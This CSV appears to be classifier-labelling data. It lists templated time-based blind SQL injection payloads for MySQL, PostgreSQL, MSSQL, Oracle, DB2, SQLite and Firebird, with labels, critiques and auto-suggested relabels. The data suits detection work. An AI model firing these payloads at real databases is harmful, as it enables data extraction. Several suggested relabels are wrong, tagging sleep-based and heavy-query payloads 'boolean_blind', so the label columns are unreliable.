payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"OR [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) OR [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])",time_blind,mysql,0.9,INFO_SCHEMA time,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"OR [RANDNUM]=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) OR [RANDNUM]=IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])",False,0,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal
"RLIKE SLEEP([SLEEPTIME]) RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))",time_blind,mysql,0.9,RLIKE time,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"RLIKE SLEEP([SLEEPTIME]) RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
"RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",time_blind,mysql,0.9,RLIKE SLEEP,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR]) RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
"AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) AND ELT([INFERENCE],SLEEP([SLEEPTIME]))",time_blind,mysql,0.9,ELT time,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) AND ELT([INFERENCE],SLEEP([SLEEPTIME]))",False,0,boolean_blind,mysql,Pattern match: 'elt(' → boolean_blind (P3); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) OR ELT([INFERENCE],SLEEP([SLEEPTIME]))",time_blind,mysql,0.9,ELT time,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME])) OR ELT([INFERENCE],SLEEP([SLEEPTIME]))",False,0,boolean_blind,mysql,Pattern match: 'elt(' → boolean_blind (P3); DB signature: mysql,time_blind,mysql,time function 'sleep(' detected
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),time_blind,postgresql,0.9,PG_SLEEP time,RELABEL,reasoning too short (13 chars),time_blind,postgresql,AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),False,0,time_blind,postgresql,Pattern match: 'pg_sleep(' → time_blind (P5); DB signature: postgresql,time_blind,postgresql,time function 'sleep(' detected
OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),time_blind,postgresql,0.9,PG_SLEEP time,RELABEL,reasoning too short (13 chars),time_blind,postgresql,OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END),False,0,time_blind,postgresql,Pattern match: 'pg_sleep(' → time_blind (P5); DB signature: postgresql,time_blind,postgresql,time function 'sleep(' detected
"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",time_blind,postgresql,0.9,GENERATE_SERIES time,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,postgresql,"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
"OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",time_blind,postgresql,0.9,GENERATE_SERIES time,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,postgresql,"OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
WAITFOR DELAY '0:0:[SLEEPTIME]' IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',time_blind,mssql,0.9,WAITFOR DELAY,RELABEL,reasoning too short (13 chars),time_blind,mssql,WAITFOR DELAY '0:0:[SLEEPTIME]' IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',False,0,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected
"AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)",time_blind,mssql,0.9,sysusers time,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)",time_blind,mssql,0.9,sysusers time,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END)",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)",time_blind,oracle,0.9,DBMS_PIPE time,RELABEL,reasoning too short (14 chars),time_blind,oracle,"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)",time_blind,oracle,0.9,DBMS_PIPE time,RELABEL,reasoning too short (14 chars),time_blind,oracle,"OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)",False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
"AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)",time_blind,oracle,0.9,ALL_USERS time,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)",time_blind,oracle,0.9,ALL_USERS time,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END)",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))",time_blind,db2,0.9,SYSTABLES time,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,db2,"AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
"OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))",time_blind,db2,0.9,SYSTABLES time,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,db2,"OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)",time_blind,mysql,0.9,LIKE time blind,RELABEL,reasoning too short (15 chars),time_blind,mysql,"AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)",False,0,time_blind,sqlite,Pattern match: 'randomblob(' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
"OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)",time_blind,mysql,0.9,LIKE time blind,RELABEL,reasoning too short (15 chars),time_blind,mysql,"OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)",False,0,time_blind,sqlite,Pattern match: 'randomblob(' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload)
"AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])",time_blind,firebird,0.9,RDB time blind,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,firebird,"AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
"OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])",time_blind,firebird,0.9,RDB time blind,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,firebird,"OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4) OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
